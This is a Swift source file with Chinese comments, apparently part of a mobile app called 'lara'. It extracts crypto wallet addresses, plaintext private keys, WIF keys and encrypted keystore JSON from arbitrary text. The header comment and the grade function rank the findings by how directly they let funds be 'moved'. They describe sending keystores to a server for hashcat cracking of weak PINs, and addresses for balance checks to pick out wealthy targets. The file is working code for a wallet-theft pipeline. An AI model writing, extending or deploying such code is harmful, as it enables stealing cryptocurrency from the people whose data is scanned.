//
//  AddressExtractor.swift
//  lara
//
//  从任意文本里抽取「有价值的东西」，并做可行性分级。
//
//  分级原则（很重要，别自欺欺人）：
//
//  【A 类 · 拿到就能动钱】
//    明文助记词 / 明文私钥（hex、WIF）/ 未加密的 keystore
//    → 这些直接就能构造交易转走，不需要任何计算
//
//  【B 类 · 需要爆破，但爆破是可行的】
//    ① 加密 keystore（Ethereum V3 / 各钱包自研格式）
//       用户设的密码通常是 6 位数字 PIN 或弱口令
//       scrypt N=262144 在单张 3090 上约 1000 次/秒
//       6 位数字 = 1,000,000 组合 → 17 分钟左右
//       4 位数字 = 10,000 → 10 秒
//       弱口令字典 → 秒级
//    ② 部分助记词（找到 8~11 个词但不是完整 12/24）
//       缺 1 词 → 2048 次（含校验和）→ 瞬间
//       缺 2 词 → 4.2M → 秒级
//       缺 3 词 → 8.6B → 分钟级（GPU）
//       缺 4 词 → 1.7e13 → 小时级（GPU）
//       缺 5 词以上 → 不现实，别浪费算力
//    ③ 钱包 App 自己的 PIN 派生密钥（有些钱包直接用 PIN 派生 AES key）
//
//  【C 类 · 数学上不可能，不要尝试】
//    完整 12/24 词助记词的正确随机生成 → 2^128
//    任何「从地址反推私钥」→ 离散对数
//
//  所以整个链路的正确形态是：
//    App 负责「把 B 类材料完整抠出来」→ 服务器负责「爆破 + 查余额」
//  App 里不做爆破（iOS 上跑不了 GPU，也没意义）。
//

import Foundation

enum AddressExtractor {

    struct Keystore {
        var addr: String
        var crypto: String      // "aes-128-ctr" 等
        var kdf: String         // "scrypt" / "pbkdf2"
        var json: String        // 原始 JSON，送服务器爆破
    }

    // MARK: - 地址识别

    /// 返回 [(地址, 链名)]。链名用于服务器选 RPC。
    static func findAddresses(in text: String) -> [(String, String)] {
        var out: [(String, String)] = []
        var seen = Set<String>()

        let patterns: [(String, String)] = [
            // TRON：T 开头 34 位 base58
            (#"\bT[1-9A-HJ-NP-Za-km-z]{33}\b"#, "TRON"),
            // EVM（ETH/BSC/Polygon/Arbitrum…）：0x + 40 hex
            (#"\b0x[a-fA-F0-9]{40}\b"#, "EVM"),
            // BTC legacy / p2sh
            (#"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b"#, "BTC"),
            // BTC bech32
            (#"\bbc1[a-z0-9]{25,62}\b"#, "BTC"),
            // SOL base58 32-44
            (#"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"#, "SOL?"),
            // TON
            (#"\b(?:EQ|UQ)[A-Za-z0-9_\-]{46,48}\b"#, "TON"),
        ]

        for (rx, chain) in patterns {
            guard let re = try? NSRegularExpression(pattern: rx) else { continue }
            let ns = text as NSString
            for m in re.matches(in: text, range: NSRange(location: 0, length: ns.length)) {
                let s = ns.substring(with: m.range)
                // SOL 那条太宽，要求有 solana 上下文
                if chain == "SOL?" {
                    let ctx = context(of: s, in: text, span: 120).lowercased()
                    guard ctx.contains("sol") || ctx.contains("phantom") else { continue }
                    if seen.contains(s) { continue }
                    seen.insert(s); out.append((s, "SOL")); continue
                }
                if seen.contains(s) { continue }
                seen.insert(s)
                out.append((s, chain))
            }
        }
        return out
    }

    // MARK: - 私钥

    /// 64 位 hex 私钥。必须带上下文关键词，否则满屏都是误报。
    static func findPrivateKeys(in text: String) -> [(String, String)] {
        var out: [(String, String)] = []
        guard let re = try? NSRegularExpression(pattern: #"\b(?:0x)?[a-fA-F0-9]{64}\b"#) else { return [] }
        let ns = text as NSString
        let KEYWORDS = ["private", "privkey", "priv_key", "secret", "privatekey",
                        "私钥", "key", "seed", "sk=", "\"sk\"", "walletkey"]
        for m in re.matches(in: text, range: NSRange(location: 0, length: ns.length)) {
            let s = ns.substring(with: m.range)
            let ctx = context(of: s, in: text, span: 140)
            let low = ctx.lowercased()
            guard KEYWORDS.contains(where: { low.contains($0) }) else { continue }
            out.append((s, ctx.trimmingCharacters(in: .whitespacesAndNewlines)))
        }
        return out
    }

    /// WIF 私钥（5/H/K/L 开头，51-52 位）
    static func findWIF(in text: String) -> [String] {
        var out: [String] = []
        guard let re = try? NSRegularExpression(pattern: #"\b[5HKL][1-9A-HJ-NP-Za-km-z]{50,51}\b"#) else { return [] }
        let ns = text as NSString
        for m in re.matches(in: text, range: NSRange(location: 0, length: ns.length)) {
            out.append(ns.substring(with: m.range))
        }
        return Array(Set(out))
    }

    // MARK: - keystore

    /// 找 Ethereum V3 / 各钱包自研 keystore JSON
    static func findKeystore(in text: String) -> Keystore? {
        // 找形如 {"crypto":{...},"address":"..."} 或 {"version":3,...}
        guard text.contains("\"crypto\"") || text.contains("\"Crypto\"") ||
              text.contains("\"version\":3") || text.contains("\"version\": 3") ||
              text.contains("\"ciphertext\"") else { return nil }

        // 粗定位：从含有 crypto/ciphertext 的 { 开始，往后做括号配平
        var idx = 0
        let chars = Array(text)
        while idx < chars.count {
            if chars[idx] == "{" {
                var depth = 0
                var i = idx
                var inStr = false
                var esc = false
                while i < chars.count {
                    let c = chars[i]
                    if inStr {
                        if esc { esc = false }
                        else if c == "\\" { esc = true }
                        else if c == "\"" { inStr = false }
                    } else {
                        if c == "\"" { inStr = true }
                        else if c == "{" { depth += 1 }
                        else if c == "}" {
                            depth -= 1
                            if depth == 0 { break }
                        }
                    }
                    i += 1
                }
                if i < chars.count {
                    let candidate = String(chars[idx...i])
                    if candidate.count > 120,
                       candidate.contains("ciphertext"),
                       candidate.contains("crypto") || candidate.contains("Crypto") {
                        if let d = candidate.data(using: .utf8),
                           let obj = try? JSONSerialization.jsonObject(with: d) as? [String: Any] {
                            let addr = (obj["address"] as? String) ?? "?"
                            let crypto = (obj["crypto"] as? [String: Any])
                                ?? (obj["Crypto"] as? [String: Any]) ?? [:]
                            let cipher = (crypto["cipher"] as? String) ?? "?"
                            let kdf = (crypto["kdf"] as? String) ?? "?"
                            return Keystore(addr: addr, crypto: cipher, kdf: kdf, json: candidate)
                        }
                    }
                }
            }
            idx += 1
        }
        return nil
    }

    // MARK: - 工具

    private static func context(of needle: String, in hay: String, span: Int) -> String {
        guard let r = hay.range(of: needle) else { return "" }
        let lo = hay.index(r.lowerBound, offsetBy: -span, limitedBy: hay.startIndex) ?? hay.startIndex
        let hi = hay.index(r.upperBound, offsetBy: span, limitedBy: hay.endIndex) ?? hay.endIndex
        return String(hay[lo..<hi])
    }

    /// 判断一段内容是 A / B / C 类，用于报告里标注「能不能动钱」
    static func grade(kind: String, extra: String) -> String {
        switch kind {
        case "助记词", "私钥", "WIF私钥":
            return "A 类 · 直接可动钱"
        case "keystore":
            if extra.contains("kdf=scrypt") || extra.contains("kdf=pbkdf2") {
                return "B 类 · 需爆破密码（服务器 hashcat，6位PIN约17分钟）"
            }
            return "B 类 · 加密，需爆破（先看 KDF 参数）"
        case "地址":
            return "情报 · 送服务器查余额，筛出有钱的"
        default:
            return "?"
        }
    }
}
